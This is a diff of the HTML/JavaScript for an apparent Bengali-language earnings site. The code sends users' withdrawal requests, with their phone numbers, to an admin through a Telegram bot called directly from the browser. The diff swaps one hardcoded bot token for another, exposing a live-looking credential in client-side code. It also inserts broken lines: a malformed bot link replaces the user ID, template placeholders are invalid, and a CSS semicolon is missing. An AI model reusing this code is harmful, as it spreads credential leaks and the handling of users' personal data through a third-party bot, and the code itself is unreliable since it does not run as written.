@@ -16,7 +16,7 @@
             --dark-color: #1a1a2e;
             --light-color: #f8f9fa;
             --card-bg: #16213e;
-            --text-color: #FF0000
+            --text-color: #6e6e6e
             --text-muted: #adb5bd;
         }
         
@@ -1099,7 +1099,8 @@
             
             // Prepare withdrawal message
             const message = `📌 নতুন উত্তোলন অনুরোধ 📌\n\n` +
-                             `👤 ব্যবহারকারী আইডি: ${userId}\n` +
+                             `👤 ব্যবহারকারী আইডি: ${[httpsh://t.me/ihakaincome01_bot?start=https
+                             \n` +
                              `💰 পরিমাণ: ${amount} টাকা\n` +
                              `📱 মাধ্যম: ${paymentMethod.toUpperCase()}\n` +
                              `📞 ফোন: ${phoneNumber}\n\n` +
@@ -1120,13 +1121,13 @@
             // Reset form after 3 seconds
             setTimeout(() => {
                 document.getElementById('withdraw-section').style.display = 'none';
-            }, 3000);
+            }, 15000);
         }
 
         // Send withdrawal request to admin via Telegram bot
         function sendWithdrawRequestToAdmin(message) {
             // Telegram API URL তৈরি করুন
-            const apiUrl = `https://api.telegram.org/bot${8950330778:AAEgunqash1B9HIRct5Y85dRZf_LFm2f0Jk}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            const apiUrl = `https://api.telegram.org/bot${8990206832:AAEgunqash1B9HIRct5Y85dRZf_LFm2f0Jk}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(message)}`;
             
             fetch(apiUrl)
                 .then(response => response.json())
